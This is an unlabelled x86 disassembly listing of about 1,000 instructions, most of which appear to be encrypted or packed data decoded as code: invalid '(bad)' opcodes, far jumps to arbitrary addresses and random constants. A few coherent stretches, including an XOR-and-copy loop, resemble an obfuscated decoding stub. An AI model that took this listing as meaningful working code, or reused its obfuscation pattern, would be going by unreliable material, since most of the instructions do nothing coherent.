  4038e7:	and    BYTE PTR [eax+eax*8+0x68f9acf7],bh
  4038ee:	mov    ecx,0x2a63729c
  4038f3:	dec    ebx
  4038f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038f5:	sti    
  4038f6:	mov    dl,0x75
  4038f8:	or     ah,BYTE PTR [eax+0x5]
  4038fb:	or     BYTE PTR [ecx+0x4d9c353c],al
  403901:	or     al,BYTE PTR [edi]
  403903:	jmp    0xcb24:0xaca11080
  40390a:	stos   DWORD PTR es:[edi],eax
  40390b:	xor    ch,BYTE PTR [ebx]
  40390d:	xchg   ecx,eax
  40390e:	dec    edi
  40390f:	clc    
  403910:	inc    ecx
  403911:	sbb    eax,esp
  403913:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403914:	std    
  403915:	ja     0x403980
  403917:	mov    esi,0x92b888a6
  40391c:	jecxz  0x403953
  40391e:	aas    
  40391f:	and    eax,0x40520602
  403924:	(bad)  
  403925:	adc    eax,0x678da5b0
  40392a:	mov    esp,0xec1de680
  40392f:	mov    bh,BYTE PTR [esi-0xc]
  403932:	mov    dl,0x76
  403934:	sbb    bl,BYTE PTR [eax-0x2d]
  403937:	mov    ds:0x8d3d12e1,al
  40393c:	mov    esp,0xc03e4024
  403941:	mov    ecx,0x7717b7ff
  403946:	jne    0x403958
  403948:	mov    ch,0xdc
  40394a:	nop
  40394b:	mul    DWORD PTR cs:[edx+0x5968e2fd]
  403952:	pop    edi
  403953:	call   0xe705:0x4b97bf5b
  40395a:	inc    esp
  40395b:	or     eax,0x357f0947
  403960:	mov    ch,0x2c
  403962:	fnstenv [bp-0x52]
  403966:	fiadd  DWORD PTR [esi-0x748aba9b]
  40396c:	sbb    BYTE PTR [ebx-0x70a8f1bc],ah
  403972:	repz mov al,ds:0x33bd0f0c
  403978:	dec    ebx
  403979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40397a:	push   edx
  40397b:	fs sub al,0x28
  40397e:	push   ecx
  40397f:	and    al,0xb6
  403981:	call   0xe6ce:0x108f8657
  403988:	jns    0x40392b
  40398a:	(bad)  
  40398b:	idiv   DWORD PTR [ebx+0x5c]
  40398e:	cdq    
  40398f:	(bad)  
  403990:	rcr    BYTE PTR [ecx+0x6a],cl
  403993:	xchg   ecx,eax
  403994:	das    
  403995:	cmp    dl,BYTE PTR [ecx]
  403997:	stos   BYTE PTR es:[edi],al
  403998:	or     BYTE PTR [ecx-0x341afbf4],al
  40399e:	jno    0x4039ef
  4039a0:	pop    edx
  4039a1:	not    DWORD PTR [edx+0x27]
  4039a4:	cwde   
  4039a5:	ja     0x403938
  4039a7:	xor    BYTE PTR [edi+ecx*4-0x60d302f3],ch
  4039ae:	sbb    eax,edi
  4039b0:	ja     0x403a2b
  4039b2:	mov    ebx,esp
  4039b4:	mov    cs,eax
  4039b6:	arpl   WORD PTR [edi+0x7473ade5],bp
  4039bc:	dec    edx
  4039bd:	ret    0x1f01
  4039c0:	jnp    0x403a00
  4039c2:	jmp    0x826ba1fe
  4039c7:	loop   0x4039c2
  4039c9:	mov    dh,0xc0
  4039cb:	jl     0x403a08
  4039cd:	sub    BYTE PTR [eax],ch
  4039cf:	sub    bh,BYTE PTR [eax-0x59]
  4039d2:	ss jmp 0x403a22
  4039d5:	mov    ds:0xdfe5cb68,eax
  4039da:	xor    eax,0x815cbfdd
  4039df:	leave  
  4039e0:	sbb    eax,0x262a6a2f
  4039e5:	test   al,0x9a
  4039e7:	push   0xee3d4f36
  4039ec:	in     al,dx
  4039ed:	outs   dx,DWORD PTR ds:[esi]
  4039ee:	pop    es
  4039ef:	dec    edx
  4039f0:	sar    edi,1
  4039f2:	pushf  
  4039f3:	rcr    BYTE PTR [ecx-0x536ff11],cl
  4039f9:	jmp    0x4039fb
  4039fb:	mov    cx,0x3b75
  4039ff:	xchg   DWORD PTR [ebx+edx*2],edx
  403a02:	or     esp,DWORD PTR [eax-0x6c6a7ff5]
  403a08:	jmp    0xaed43446
  403a0d:	jns    0x403a2a
  403a0f:	push   edi
  403a10:	arpl   sp,bx
  403a12:	pop    esp
  403a13:	cmp    eax,0x84027291
  403a18:	mov    eax,0x2ae18638
  403a1d:	and    eax,0x69a8d278
  403a22:	push   es
  403a23:	lods   eax,DWORD PTR ds:[esi]
  403a24:	push   ds
  403a25:	inc    esp
  403a26:	cmp    ebp,DWORD PTR [ebx]
  403a28:	dec    esi
  403a29:	mov    bl,0x85
  403a2b:	lds    edi,FWORD PTR [edx]
  403a2d:	or     eax,0x1cc2a52a
  403a32:	jnp    0x403a99
  403a34:	into   
  403a35:	inc    edi
  403a36:	sub    al,0x89
  403a38:	fistp  QWORD PTR [edi]
  403a3a:	adc    bl,0xd2
  403a3d:	jae    0x403a62
  403a3f:	jns    0x403a64
  403a41:	or     ebx,DWORD PTR [eax]
  403a43:	inc    ecx
  403a44:	jle    0x403a9d
  403a46:	leave  
  403a47:	cmp    eax,0xca25b9e1
  403a4c:	in     eax,0xae
  403a4e:	test   al,0xae
  403a50:	mov    edi,DWORD PTR [ebp-0x4]
  403a53:	jmp    0x403c5f
  403a58:	addr16 jo 0x403aaa
  403a5b:	or     BYTE PTR [ebx+0x33],cl
  403a5e:	arpl   WORD PTR [ebx+0x3c],si
  403a61:	aas    
  403a62:	cwde   
  403a63:	pop    ss
  403a64:	imul   edx,DWORD PTR [esi+0x1e65210c],0x7f6d7c7c
  403a6e:	jl     0x403aec
  403a70:	add    eax,0x1262f9d
  403a75:	sub    al,0xc0
  403a77:	fsubp  st(4),st
  403a79:	jmp    0x403aa4
  403a7b:	adc    DWORD PTR [ecx-0x70],0xffffffea
  403a7f:	xchg   ecx,eax
  403a80:	jge    0x403a41
  403a82:	mov    eax,ds:0xa180c47a
  403a87:	dec    edx
  403a88:	mov    ecx,0x9ca4d8a4
  403a8d:	or     edx,DWORD PTR [ebp-0x41aa7237]
  403a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a94:	dec    ecx
  403a95:	(bad)  
  403a96:	scas   eax,DWORD PTR es:[edi]
  403a97:	stc    
  403a98:	xchg   esi,eax
  403a99:	push   esp
  403a9a:	lds    edx,FWORD PTR [ebx+0x4f]
  403a9d:	pop    ss
  403a9e:	push   edi
  403a9f:	jns    0x403b0f
  403aa1:	and    DWORD PTR [ebp-0x28],edx
  403aa4:	repnz or ecx,DWORD PTR [edx-0x478596d5]
  403aab:	lods   al,BYTE PTR ds:[esi]
  403aac:	inc    ecx
  403aad:	mov    ecx,0xa857118b
  403ab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ab3:	push   ebp
  403ab4:	and    bh,BYTE PTR [ebx-0x18]
  403ab7:	mov    ebp,0xfc131bfe
  403abc:	xchg   esp,eax
  403abd:	(bad)  
  403abe:	mov    esi,0x908efac0
  403ac3:	ins    DWORD PTR es:[edi],dx
  403ac4:	push   ecx
  403ac5:	mov    ecx,0x917f7694
  403aca:	imul   ebx,DWORD PTR [ebx],0x5a
  403acd:	inc    esi
  403ace:	jns    0x403a64
  403ad0:	xchg   ecx,eax
  403ad1:	mov    ebp,0xa6a29e98
  403ad6:	fcomp  QWORD PTR [esi]
  403ad8:	mov    al,ds:0x10635b62
  403add:	jge    0x403ada
  403adf:	pop    ss
  403ae0:	jmp    0x403b3a
  403ae2:	ret    0xf39a
  403ae5:	pop    edx
  403ae6:	xchg   BYTE PTR [edi],bh
  403ae8:	jl     0x403b38
  403aea:	imul   ebx,DWORD PTR [ebp+0x14],0x605b5a9d
  403af1:	push   ebx
  403af2:	fstp   DWORD PTR [esi+0x5b]
  403af5:	cbw    
  403af7:	cld    
  403af8:	jmp    0xc85a:0x41e3b3a6
  403aff:	and    BYTE PTR [eax],bh
  403b01:	pushf  
  403b02:	or     DWORD PTR [edx+0x8],ebx
  403b05:	outs   dx,DWORD PTR ds:[esi]
  403b06:	(bad)  
  403b07:	adc    DWORD PTR [edi+0x2b0d81],esi
  403b0d:	lods   eax,DWORD PTR ds:[esi]
  403b0e:	and    BYTE PTR [eax+0x29],bl
  403b11:	sub    BYTE PTR es:[edx+0x6529c4],bh
  403b18:	mov    edi,0xf5b8f1f
  403b1d:	add    al,0xa1
  403b1f:	js     0x403b41
  403b21:	es fsub st(1),st
  403b24:	pusha  
  403b25:	dec    ebp
  403b26:	test   al,0x2f
  403b28:	jbe    0x403b54
  403b2a:	retf   
  403b2b:	stos   DWORD PTR es:[edi],eax
  403b2c:	cmp    eax,0x15628e02
  403b31:	or     eax,0xe2d4e494
  403b36:	int3   
  403b37:	inc    BYTE PTR [eax]
  403b39:	mov    ds:0x5c6583e3,eax
  403b3e:	xor    al,0xa
  403b40:	shl    esp,0xa0
  403b43:	inc    edi
  403b44:	stos   DWORD PTR es:[edi],eax
  403b45:	fcomip st,st(6)
  403b47:	jnp    0x403ae3
  403b49:	or     al,0x3
  403b4b:	or     eax,0xe0d39651
  403b50:	stos   BYTE PTR es:[edi],al
  403b51:	ret    
  403b52:	push   ebx
  403b53:	sbb    al,0x16
  403b55:	jp     0x403b00
  403b57:	adc    al,0x84
  403b59:	mov    ?,WORD PTR [ebx+0x3a]
  403b5c:	mov    ebp,0xddcf0001
  403b61:	pop    ebx
  403b62:	or     eax,0x8f13edc5
  403b67:	test   BYTE PTR [ecx+edi*4],0x89
  403b6b:	fst    QWORD PTR [edx]
  403b6d:	std    
  403b6e:	sub    DWORD PTR [ecx+eiz*2],eax
  403b71:	adc    edx,DWORD PTR [esp+0x67]
  403b75:	mov    esi,0x2656819b
  403b7a:	xchg   ecx,eax
  403b7b:	mov    dh,0xf1
  403b7d:	adc    edi,DWORD PTR [edi+0x15d2e50c]
  403b83:	mov    esi,0x51d72e41
  403b88:	sbb    al,0xbf
  403b8a:	je     0x403b91
  403b8c:	ja     0x403ba9
  403b8e:	push   ebx
  403b8f:	fwait
  403b90:	mov    al,ds:0xa7d0d43b
  403b95:	adc    esi,DWORD PTR [edi-0x62]
  403b98:	(bad)  
  403b9a:	imul   esp,DWORD PTR [edx+0x36],0x40
  403b9e:	aas    
  403b9f:	iret   
  403ba0:	xor    cl,bh
  403ba2:	loop   0x403b4d
  403ba4:	xchg   BYTE PTR [eax+0x4f],bh
  403ba7:	dec    edx
  403ba8:	jecxz  0x403bfa
  403baa:	int    0x70
  403bac:	lock out dx,eax
  403bae:	test   DWORD PTR [ebx],0x708fb771
  403bb4:	icebp  
  403bb5:	and    eax,DWORD PTR [edx+0x3a]
  403bb8:	push   cs
  403bb9:	icebp  
  403bba:	pop    edx
  403bbb:	sbb    DWORD PTR [edx+0x55],esi
  403bbe:	loopne 0x403c08
  403bc0:	call   0x3f6cd2ce
  403bc5:	and    DWORD PTR [eax+ecx*2-0x4b],esp
  403bc9:	shr    BYTE PTR [ebp+eiz*1-0x7accc22],1
  403bd0:	xchg   ebx,eax
  403bd1:	addr16 xor eax,0x32c27283
  403bd7:	sub    BYTE PTR [ecx+0xc],cl
  403bda:	jmp    0x3c0caa7e
  403bdf:	add    al,0xc3
  403be1:	call   0x47fc4945
  403be6:	pop    es
  403be7:	or     esp,DWORD PTR [eax+0x16f08e4b]
  403bed:	jp     0x403bc9
  403bef:	mov    ecx,0x3f1d4ebf
  403bf4:	mov    ah,0xc8
  403bf6:	lfs    esi,FWORD PTR [edx-0x28]
  403bfa:	xor    esi,esi
  403bfc:	shl    DWORD PTR [eax+0x2e],0x6b
  403c00:	push   eax
  403c01:	or     BYTE PTR [ebx],dh
  403c03:	adc    BYTE PTR [ecx-0x71],ah
  403c06:	cmp    ah,bh
  403c08:	scas   eax,DWORD PTR es:[edi]
  403c09:	mov    ebx,DWORD PTR [edi-0x6b]
  403c0c:	fcom   st(0)
  403c0e:	mov    BYTE PTR [ebp-0x53ac9f93],bh
  403c14:	xchg   edi,eax
  403c15:	mov    ecx,0x563236f6
  403c1a:	test   bl,ch
  403c1c:	pushf  
  403c1d:	cmp    ebx,DWORD PTR [edx]
  403c1f:	pop    eax
  403c20:	fsubr  st(4),st
  403c22:	test   BYTE PTR [ebx+0x30],al
  403c25:	aad    0xd0
  403c27:	(bad)  
  403c28:	pop    DWORD PTR [ebx]
  403c2a:	or     cl,BYTE PTR [edi+0x655194a]
  403c30:	retf   0x63b7
  403c33:	das    
  403c34:	inc    edx
  403c35:	xchg   ecx,eax
  403c36:	and    BYTE PTR [esi],bl
  403c38:	jmp    0xea71b06f
  403c3d:	fbstp  TBYTE PTR [edi]
  403c3f:	fyl2x  
  403c41:	loopne 0x403c3d
  403c43:	dec    edx
  403c44:	or     ch,BYTE PTR [eax+0x126c8d20]
  403c4a:	mov    eax,ds:0x4839c4d7
  403c4f:	jmp    0x7546:0xea96cef2
  403c56:	and    DWORD PTR [eax],0x23
  403c59:	shl    cl,cl
  403c5b:	mov    dh,0x72
  403c5d:	cmp    DWORD PTR [ebx+0x33],ecx
  403c60:	stc    
  403c61:	add    edi,esi
  403c63:	mov    esi,DWORD PTR [ebp+0x8]
  403c66:	imul   edi,edx
  403c69:	mov    ebx,DWORD PTR [ebp+0xc]
  403c6c:	xor    eax,ecx
  403c6e:	add    eax,edx
  403c70:	mov    al,BYTE PTR [ebx+eax*1+0x32729a]
  403c77:	mov    BYTE PTR [edi+esi*1],al
  403c7a:	mov    eax,DWORD PTR [ebp-0x4]
  403c7d:	xor    eax,ecx
  403c7f:	lea    edx,[edx+eax*1+0x32729a]
  403c86:	mov    eax,DWORD PTR [ebp-0x4]
  403c89:	xor    eax,ecx
  403c8b:	mov    esi,0xffcd8d66
  403c90:	jmp    0x403e9c
  403c95:	dec    edi
  403c96:	push   ss
  403c97:	sbb    eax,DWORD PTR [ebp+ebp*2+0x7d]
  403c9b:	jae    0x403cae
  403c9d:	sti    
  403c9e:	adc    ebp,DWORD PTR ds:0x320a8897
  403ca4:	sub    BYTE PTR [edx+0x18],cl
  403ca7:	jl     0x403d25
  403ca9:	ins    DWORD PTR es:[edi],dx
  403caa:	jg     0x403d28
  403cac:	jl     0x403d22
  403cae:	and    dh,BYTE PTR [edx+esi*4+0x44806285]
  403cb5:	test   cl,dh
  403cb7:	xor    eax,DWORD PTR [ebx+edx*1+0x36728f2f]
  403cbe:	mov    dh,0x89
  403cc0:	cld    
  403cc1:	adc    BYTE PTR [esi-0x8],bl
  403cc4:	adc    al,0x5e
  403cc6:	mov    ds:0x231c3e6b,al
  403ccb:	adc    eax,0xdf96bdd6
  403cd0:	aam    0x77
  403cd2:	dec    edi
  403cd3:	or     eax,0x5ef30e89
  403cd8:	addr16 sub eax,0xcd0bf7b7
  403cde:	xor    DWORD PTR [ebp+0x712753a0],esi
  403ce4:	retf   0x2c22
  403ce7:	mov    ecx,0xc78d8d8d
  403cec:	add    al,0x97
  403cee:	mov    dh,0x7b
  403cf0:	xchg   edx,eax
  403cf1:	shr    edx,cl
  403cf3:	mov    dl,BYTE PTR [edi+0x39b8f947]
  403cf9:	hlt    
  403cfa:	scas   al,BYTE PTR es:[edi]
  403cfb:	sub    eax,0xd22adb3e
  403d00:	jg     0x403ce4
  403d02:	lahf   
  403d03:	or     DWORD PTR [edi+0x4a1ef181],eax
  403d09:	push   0x5455b739
  403d0e:	iret   
  403d0f:	sbb    edi,DWORD PTR [ecx+0x73]
  403d12:	cmp    al,0xa
  403d14:	imul   edi,esi,0xecfb605e
  403d1a:	lds    edi,FWORD PTR [ecx+ebp*8+0x7b]
  403d1e:	push   esi
  403d1f:	nop
  403d20:	cbw    
  403d22:	sar    BYTE PTR [ebp-0x75f65cdc],1
  403d28:	lahf   
  403d29:	pop    ss
  403d2a:	xor    ecx,DWORD PTR [ebx+0x4c]
  403d2d:	pushf  
  403d2e:	es push ebp
  403d30:	or     eax,0x184950b4
  403d35:	jo     0x403db0
  403d37:	(bad)  [edx+0x7b3dad37]
  403d3d:	jmp    0x403cd4
  403d3f:	rol    DWORD PTR [eax+0x1f6d6d7f],0xb5
  403d46:	out    dx,eax
  403d47:	push   esi
  403d48:	xchg   ebx,eax
  403d49:	adc    DWORD PTR [edi+0x23eccff4],0x8c31367a
  403d53:	mov    eax,ds:0x294a8c0d
  403d58:	pop    ecx
  403d59:	mov    eax,ds:0x55d841c6
  403d5e:	pop    ebp
  403d5f:	pop    edx
  403d60:	sbb    bl,BYTE PTR [esi]
  403d62:	ret    
  403d63:	retf   
  403d64:	push   ebp
  403d65:	mov    ebp,0xb36aaaac
  403d6a:	or     eax,0xa99308c3
  403d6f:	clc    
  403d70:	pop    edi
  403d71:	ins    DWORD PTR es:[edi],dx
  403d72:	mov    edx,0x85ce2470
  403d77:	sbb    eax,0xc5445e53
  403d7c:	cli    
  403d7d:	pop    ebp
  403d7e:	adc    BYTE PTR [ecx-0x56],dh
  403d81:	sub    eax,0x87023af8
  403d86:	mov    cl,0xec
  403d88:	cmp    bh,BYTE PTR [esi-0x24c7065d]
  403d8e:	mov    al,ds:0x5cc89629
  403d93:	add    BYTE PTR [esi-0xaf59d4c],ah
  403d99:	inc    edi
  403d9a:	loope  0x403d3f
  403d9c:	jmp    0x2c25:0x2b6bfc4a
  403da3:	xor    edi,DWORD PTR [esi-0x79]
  403da6:	rcl    BYTE PTR [ecx+ecx*8],1
  403da9:	cmp    al,0x3d
  403dab:	mov    al,ds:0xc1bbdd36
  403db0:	mov    dl,cl
  403db2:	les    ecx,FWORD PTR [edx]
  403db4:	and    DWORD PTR ds:0x9b77c41a,0xc9cc5855
  403dbe:	pop    ebp
  403dbf:	inc    ebp
  403dc0:	cli    
  403dc1:	test   al,0x70
  403dc3:	mov    ecx,DWORD PTR [esi-0x7bc08d31]
  403dc9:	or     eax,0xd948296
  403dce:	pop    ebp
  403dcf:	and    DWORD PTR [ebx+0xa],ecx
  403dd2:	jb     0x403d57
  403dd4:	aas    
  403dd5:	mov    ebx,0x8da4d027
  403dda:	mov    esi,0xfed372de
  403ddf:	ficomp DWORD PTR [ecx+0x1e]
  403de2:	jmp    0x403e36
  403de4:	enter  0xce22,0x20
  403de8:	test   al,0x57
  403dea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403deb:	nop
  403dec:	mov    WORD PTR [edx+0x57],fs
  403def:	inc    esp
  403df0:	lods   al,BYTE PTR ds:[esi]
  403df1:	shr    DWORD PTR [ecx-0x2d1f8349],cl
  403df7:	mov    ecx,0xd4d02e01
  403dfc:	scas   eax,DWORD PTR es:[edi]
  403dfd:	inc    ebx
  403dfe:	outs   dx,DWORD PTR ds:[esi]
  403dff:	mov    WORD PTR [ebx],?
  403e01:	retf   0x1cfb
  403e04:	and    BYTE PTR [edi-0x2b12f389],0xd6
  403e0b:	mov    dl,0xd7
  403e0d:	mov    DWORD PTR [edx+eax*8],edx
  403e10:	jae    0x403db2
  403e12:	int    0xca
  403e14:	fimul  WORD PTR [ebp+0x2d]
  403e17:	cmp    DWORD PTR ds:[ebx+0x521c652],ecx
  403e1e:	nop
  403e1f:	add    BYTE PTR [eax-0x37d29fae],ah
  403e25:	inc    ecx
  403e26:	repnz les edi,FWORD PTR [ebp+0x347ecdff]
  403e2d:	pop    ss
  403e2e:	lea    eax,[eax]
  403e30:	rcl    BYTE PTR [edi],1
  403e32:	push   cs
  403e33:	icebp  
  403e34:	mov    ebx,0xa8a5a589
  403e39:	hlt    
  403e3a:	jo     0x403ead
  403e3c:	mov    al,ds:0xc4d3467f
  403e41:	sbb    BYTE PTR [ebx-0x6c],bl
  403e44:	sub    BYTE PTR [ecx+0x69],cl
  403e47:	addr16 push edi
  403e49:	leave  
  403e4a:	in     al,0xa0
  403e4c:	xor    bl,BYTE PTR [edi]
  403e4e:	push   ebx
  403e4f:	stos   DWORD PTR es:[edi],eax
  403e50:	outs   dx,DWORD PTR ds:[esi]
  403e51:	mov    esi,0x92d5acb
  403e56:	call   0x375a:0xdfeab512
  403e5d:	jne    0x403ea9
  403e5f:	jno    0x403df7
  403e61:	cmp    bl,BYTE PTR [ebp+0x719ce695]
  403e67:	int    0xb4
  403e69:	in     al,dx
  403e6a:	clc    
  403e6b:	xchg   ebp,eax
  403e6c:	out    0x9d,eax
  403e6e:	repnz push ss
  403e70:	mov    eax,ds:0xa00c5d43
  403e75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e76:	or     eax,0xae5ebb4
  403e7b:	mov    al,0x20
  403e7d:	pop    edi
  403e7e:	push   ebp
  403e7f:	test   dh,cl
  403e81:	sub    eax,0x1aa993c3
  403e86:	mov    eax,0x2a69e2dd
  403e8b:	icebp  
  403e8c:	repz xchg esi,eax
  403e8e:	adc    BYTE PTR [ecx-0x15],bl
  403e91:	sub    al,0xdc
  403e93:	aaa    
  403e94:	fld    DWORD PTR [edx+0x4ea779fb]
  403e9a:	pop    edx
  403e9b:	les    ebp,FWORD PTR [ebx]
  403e9d:	lock add esi,DWORD PTR [ebp+0x10]
  403ea1:	cmp    edx,esi
  403ea3:	jbe    0x403630
  403ea9:	pop    ebx
  403eaa:	mov    eax,0xf89c8534
  403eaf:	pop    edi
  403eb0:	pop    esi
  403eb1:	leave  
  403eb2:	ret    0xc
  403eb5:	push   ebp
  403eb6:	mov    ebp,esp
  403eb8:	mov    eax,DWORD PTR [ebp+0xc]
  403ebb:	xor    edx,edx
  403ebd:	mov    ecx,0x7264fcad
  403ec2:	div    ecx
  403ec4:	mov    ecx,DWORD PTR [ebp+0x10]
  403ec7:	and    ecx,eax
  403ec9:	jmp    0x4040d5
  403ece:	(bad)  
  403ecf:	addr16 jns 0x403f24
  403ed2:	icebp  
  403ed3:	jb     0x403f28
  403ed5:	ins    DWORD PTR es:[edi],dx
  403ed6:	add    al,0x2a
  403ed8:	pop    esi
  403ed9:	push   0x66a061cf
  403ede:	mov    ebx,0x6d7c7c1a
  403ee3:	jg     0x403f61
  403ee5:	jl     0x403e67
  403ee7:	(bad)  
  403ee9:	pop    ecx
  403eea:	sbb    eax,0xfc82c12d
  403eef:	shl    eax,1
  403ef1:	jge    0x403f27
  403ef3:	shl    BYTE PTR [edi],1
  403ef5:	ss in  eax,0x9
  403ef8:	imul   esi,esp,0xfd044a87
  403efe:	mov    edi,0x123eb43d
  403f03:	fist   WORD PTR [edi-0x5033d581]
  403f09:	fcom   st(2)
  403f0b:	or     al,0xb4
  403f0d:	fsubr  DWORD PTR ds:0x51c2bfa6
  403f13:	jle    0x403f09
  403f15:	sbb    al,0x73
  403f17:	push   ss
  403f18:	jmp    0x44df00fb
  403f1d:	cwde   
  403f1e:	bnd jbe 0x403eb2
  403f21:	pop    esp
  403f22:	xchg   esp,eax
  403f23:	adc    esp,DWORD PTR [ebx]
  403f25:	adc    cl,bh
  403f27:	inc    edi
  403f28:	data16 and bh,BYTE PTR [eax+eax*8-0x31cdf94f]
  403f30:	leave  
  403f31:	(bad)  
  403f32:	into   
  403f33:	enter  0xe4eb,0x2a
  403f37:	popf   
  403f38:	xor    eax,0x2366726b
  403f3d:	sub    BYTE PTR [edi+0x2a841ae7],0x4d
  403f44:	add    eax,DWORD PTR [edx]
  403f46:	and    BYTE PTR [edi],dl
  403f48:	scas   eax,DWORD PTR es:[edi]
  403f49:	or     DWORD PTR [edx+0x23],ecx
  403f4c:	sbb    dl,BYTE PTR [esi-0x2cccd16e]
  403f52:	sub    dh,0x4c
  403f55:	xor    eax,0xad5f6fa
  403f5a:	jge    0x403f26
  403f5c:	int3   
  403f5d:	and    al,BYTE PTR [edi+eiz*8]
  403f60:	addr16 mov cl,0x70
  403f63:	sbb    al,0x85
  403f65:	std    
  403f66:	sbb    dl,BYTE PTR [ebx-0x601ac9e9]
  403f6c:	imul   BYTE PTR [ebp-0x27f1caa7]
  403f72:	fwait
  403f73:	jb     0x403f6f
  403f75:	stc    
  403f76:	sub    BYTE PTR [ebp-0x6a],0x29
  403f7a:	arpl   WORD PTR [edx],sp
  403f7c:	ss jbe 0x403fa2
  403f7f:	call   0x571da6d4
  403f84:	test   ax,0x806e
  403f88:	test   al,0x7c
  403f8a:	addr16 fs loop 0x403f1b
  403f8e:	in     eax,0xce
  403f90:	xchg   esi,eax
  403f91:	and    eax,0xa798489b
  403f96:	inc    ebp
  403f97:	dec    ecx
  403f98:	(bad)  
  403f99:	and    bl,BYTE PTR [edx-0x4e]
  403f9c:	js     0x404003
  403f9e:	sahf   
  403f9f:	sbb    DWORD PTR [edi+0x68],0xffffffce
  403fa3:	sbb    BYTE PTR [ebx+0xd743b10],ch
  403fa9:	sti    
  403faa:	xor    bl,BYTE PTR [ebp+0x58]
  403fad:	and    al,0x2
  403faf:	pop    es
  403fb0:	sub    dl,BYTE PTR [esi-0x77]
  403fb3:	xchg   eax,edx
  403fb5:	fwait
  403fb6:	dec    ecx
  403fb7:	ins    BYTE PTR es:[edi],dx
  403fb8:	ret    
  403fb9:	mov    ebp,DWORD PTR [esp+ecx*2]
  403fbc:	push   esi
  403fbd:	mov    esp,ecx
  403fbf:	mov    eax,ds:0xc7479dac
  403fc4:	fldcw  WORD PTR [ebx+0x44]
  403fc7:	aaa    
  403fc8:	push   ecx
  403fc9:	sbb    eax,0xc68a000c
  403fce:	(bad)  
  403fcf:	scas   eax,DWORD PTR es:[edi]
  403fd0:	(bad)  
  403fd1:	cli    
  403fd2:	mov    dh,0x3e
  403fd4:	pushf  
  403fd5:	mov    eax,ds:0x4c5519c2
  403fda:	jmp    0x2084:0xd64e854b
  403fe1:	mov    al,BYTE PTR [ebp-0x69]
  403fe4:	mov    esp,0x26c26ac4
  403fe9:	pop    esp
  403fea:	dec    esp
  403feb:	scas   al,BYTE PTR es:[edi]
  403fec:	sbb    BYTE PTR [esi],bh
  403fee:	imul   ebp,eax,0xffffffbb
  403ff1:	stc    
  403ff2:	je     0x403fdd
  403ff4:	in     al,0xc4
  403ff6:	mov    ah,0xb9
  403ff8:	mov    ah,0x9d
  403ffa:	aam    0x7
  403ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ffd:	jb     0x404036
  403fff:	dec    esi
  404000:	rol    BYTE PTR ds:0x9cff061b,0x94
  404007:	mov    ebx,0x2f1e9c1f
  40400c:	sbb    DWORD PTR gs:[edi+0x3b],ebp
  404010:	inc    edi
  404011:	adc    al,0x42
  404013:	mov    al,0xf3
  404015:	out    dx,eax
  404016:	adc    DWORD PTR [esi+0x26],esi
  404019:	pushf  
  40401a:	pop    ecx
  40401b:	and    edi,edx
  40401d:	ror    DWORD PTR [esi],0x8e
  404020:	push   cs
  404021:	cmc    
  404022:	xor    BYTE PTR [si+0x71],bh
  404026:	adc    al,ch
  404028:	mov    edi,0x35c819b
  40402d:	xchg   DWORD PTR [edx+0x12],esi
  404030:	cs rcl cl,0xb
  404034:	jmp    0x1006761e
  404039:	or     al,0x6b
  40403b:	mov    al,0x67
  40403d:	push   0x65ab3100
  404042:	add    al,0xaf
  404044:	xor    BYTE PTR [edx-0x2111f843],bh
  40404a:	ror    DWORD PTR [edi-0x1aa15a4c],cl
  404050:	aad    0xf3
  404052:	clc    
  404053:	jle    0x404087
  404055:	repnz jmp 0x7e84:0x29758be8
  40405d:	stos   DWORD PTR es:[edi],eax
  40405e:	(bad)  
  40405f:	sub    edx,ebp
  404061:	aas    
  404062:	sbb    eax,0x30d8269c
  404067:	adc    DWORD PTR [edx-0x66e34432],ebp
  40406d:	jnp    0x404017
  40406f:	jb     0x404016
  404071:	lods   al,BYTE PTR ds:[esi]
  404072:	fwait
  404073:	in     al,dx
  404074:	dec    esp
  404075:	fnstsw WORD PTR [ecx+ebp*8+0xd]
  404079:	cmp    DWORD PTR [ebx+0xd],0xffffffb0
  40407d:	mov    bl,0x7e
  40407f:	ror    DWORD PTR [ecx+0x79e6dcd8],0x5f
  404086:	rcl    BYTE PTR [ecx],0x4f
  404089:	jno    0x404075
  40408b:	xor    eax,DWORD PTR [ebx-0x1978c0f8]
  404091:	ins    BYTE PTR es:[edi],dx
  404092:	xchg   ebx,esi
  404094:	lahf   
  404095:	mov    BYTE PTR [esi+0x38],cl
  404098:	nop
  404099:	xchg   ecx,eax
  40409a:	mov    al,ds:0xd749e0f7
  40409f:	adc    DWORD PTR [edx],ecx
  4040a1:	mov    WORD PTR [eax],es
  4040a3:	stos   BYTE PTR es:[edi],al
  4040a4:	jne    0x4040b4
  4040a6:	(bad)  
  4040a8:	push   ds
  4040a9:	inc    esp
  4040aa:	mov    al,ds:0x5233a1f7
  4040af:	stc    
  4040b0:	mov    cl,0xc0
  4040b2:	cs cmp al,0x3c
  4040b5:	xor    dh,BYTE PTR [edx+0x1e]
  4040b8:	xchg   cl,bl
  4040ba:	mov    dh,0x5
  4040bc:	add    al,0x50
  4040be:	xchg   ebx,eax
  4040bf:	loopne 0x404104
  4040c1:	mov    cl,0xb6
  4040c3:	cmc    
  4040c4:	das    
  4040c5:	fninit 
  4040c7:	adc    DWORD PTR [eax],ebx
  4040c9:	adc    al,0x18
  4040cb:	add    al,BYTE PTR [edi]
  4040cd:	jmp    0xa78c42ea
  4040d2:	mov    ds:0xc9818567,al
  4040d7:	(bad)  
  4040d8:	sbb    eax,0xc18b8116
  4040dd:	pop    ebp
  4040de:	ret    0x18
  4040e1:	push   ebp
  4040e2:	mov    ebp,esp
  4040e4:	sub    esp,0x58
  4040e7:	xor    DWORD PTR ds:0x433733,0x2c9d
  4040f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4040f4:	sbb    eax,DWORD PTR ds:0x433773
  4040fa:	mov    eax,0x8a3a
  4040ff:	sub    DWORD PTR ds:0x4336ab,0x44c4
  404109:	xor    ax,WORD PTR [ecx+0x20]
  40410d:	sub    ecx,0x3d49
  404113:	mov    ecx,0x3b00
  404118:	xor    DWORD PTR ds:0x433647,0x649a
  404122:	add    ax,cx
  404125:	movzx  eax,ax
